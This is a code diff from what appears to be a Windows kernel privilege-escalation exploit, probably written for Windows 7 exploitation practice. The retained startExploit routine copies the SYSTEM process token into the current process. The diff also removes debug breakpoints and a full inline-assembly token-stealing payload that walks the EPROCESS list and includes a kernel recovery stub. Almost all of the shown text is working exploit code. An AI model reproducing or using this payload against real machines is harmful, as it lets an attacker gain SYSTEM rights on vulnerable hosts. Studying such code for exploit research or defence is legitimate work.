@@ -146,10 +146,6 @@ public:
 
 	static auto startExploit() -> void {
 
-		if (!DbgPrint || !PsInitialSystemProcess || !PsGetCurrentProcessId || !PsLookupProcessByProcessId)
-			return;
-
-		__asm int 3;
 		__asm pushad;
 
 		//DbgPrint("Hello World\n");
@@ -180,51 +176,12 @@ public:
 		auto systemProcessTokenOffset = ((byte*)systemEProcess + 0xf8);
 		*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;
 
-		__asm int 3;
-
 	exit:
 		__asm popad;
 		__asm xor eax, eax;
 		__asm add esp, 12;
 		__asm pop ebp;
 		__asm ret 8;
-	}
-
-	static void TokenStealingPayloadWin7() {
-		// Importance of Kernel Recovery
-		__asm {
-			pushad; Save registers state
-
-			; Start of Token Stealing Stub
-			xor eax, eax; Set ZERO
-			mov eax, fs: [eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
-			; _KTHREAD is located at FS : [0x124]
-
-			mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
-
-			mov ecx, eax; Copy current process _EPROCESS structure
-
-			mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4
-
-			SearchSystemPID:
-			mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
-				sub eax, FLINK_OFFSET
-				cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
-				jne SearchSystemPID
-
-				mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
-				mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
-				; with SYSTEM process nt!_EPROCESS.Token
-				; End of Token Stealing Stub
-
-				popad; Restore registers state
-
-				; Kernel Recovery Stub
-				xor eax, eax; Set NTSTATUS SUCCEESS
-				add esp, 12; Fix the stack
-				pop ebp; Restore saved EBP
-				ret 8; Return cleanly
-		}
 	}
 };
 
